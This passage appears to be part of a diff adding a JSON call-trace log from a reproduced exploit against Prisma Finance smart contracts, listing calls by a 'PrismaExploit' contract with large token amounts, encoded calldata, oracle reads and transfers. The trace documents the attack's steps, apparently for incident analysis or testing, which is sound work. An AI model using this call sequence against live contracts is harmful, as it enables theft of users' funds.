+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000000 [2e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "390664",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 2000000000000000000000 [2e21], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000458a6330674daf1a93000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "379644",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 2000000000000000000000 [2e21], 1800000000000000000 [1.8e18], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000458a6330674daf1a93000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9"
+    },
+    {
+        "id": "101286",
+        "args": "0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "5591",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000d3308c3fc8f88c2050000000000000000000000000000000000000000000043061fa1a4e34f7efb8790000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "5413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000d3308c3fc8f88c2050000000000000000000000000000000000000000000043061fa1a4e34f7efb8790000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "3578",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000077432217eba2da1150"
+    },
+    {
+        "id": "3403",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000077432217eba2da1150"
+    },
+    {
+        "id": "22256",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC7218100da61441905e0c327749972e3CBee9EE, 1000000000000000000 [1e18], 2200000000022002930000 [2.2e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "22069",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC7218100da61441905e0c327749972e3CBee9EE, 1000000000000000000 [1e18], 2200000000022002930000 [2.2e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000001e"
+    },
+    {
+        "id": "368",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000001e"
+    },
+    {
+        "id": "4203",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "4034",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3368",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5536",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 2000000000022002930000 [2e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "275967",
+        "args": "0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000325833471 [5e15], 1282797208306130557587 [1.282e21], 2001800000000000000000 [2.001e21], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "417",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "5591",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000d322ab891551282050000000000000000000000000000000000000000000042feab6f836495515a7290000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "5413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000d322ab891551282050000000000000000000000000000000000000000000042feab6f836495515a7290000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "3736",
+        "args": "2001800000000000000000 [2.001e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000520a83b5d"
+    },
+    {
+        "id": "3564",
+        "args": "2001800000000000000000 [2.001e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000520a83b5d"
+    },
+    {
+        "id": "359",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000fdce0267803c6a0d209d3721d2f01fd618e9cbf8"
+    },
+    {
+        "id": "2972",
+        "args": "0xfdCE0267803C6a0D209D3721d2f01Fd618e9CBF8, 22022732637 [2.202e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1430",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000f43fc2c04ee0000"
+    },
+    {
+        "id": "1264",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000f43fc2c04ee0000"
+    },
+    {
+        "id": "174758",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1282797208306130557587 [1.282e21], 2201800000022022732637 [2.201e21], 58261295680502308484 [5.826e19], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000458a6330674daf1a93000000000000000000000000000000000000000000000000000000000000001d"
+    },
+    {
+        "id": "174547",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1282797208306130557587 [1.282e21], 2201800000022022732637 [2.201e21], 58261295680502308484 [5.826e19], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000458a6330674daf1a93000000000000000000000000000000000000000000000000000000000000001d"
+    },
+    {
+        "id": "56874",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 58261295680502308484 [5.826e19], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "56687",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 58261295680502308484 [5.826e19], 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A, 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3238",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "3066",
+        "args": "0x3B15CEc2d922Ab0Ef74688bcC1056461049f89CB",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000002876919d00e0253"
+    },
+    {
+        "id": "6080",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, 1282797208306130557587 [1.282e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "8290",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 2001800000000000000000 [2.001e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "359",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000fdce0267803c6a0d209d3721d2f01fd618e9cbf8"
+    },
+    {
+        "id": "120538",
+        "args": "0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "6464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6286",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "5591",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000118ad0eb97c9ed73ae3000000000000000000000000000000000000000000043062131530ab8cd1e2860000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "5413",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000118ad0eb97c9ed73ae3000000000000000000000000000000000000000000043062131530ab8cd1e2860000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000007f01159337f456960c000000000000000000000000000000000000000000039578da8a2ffb40f89f060000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
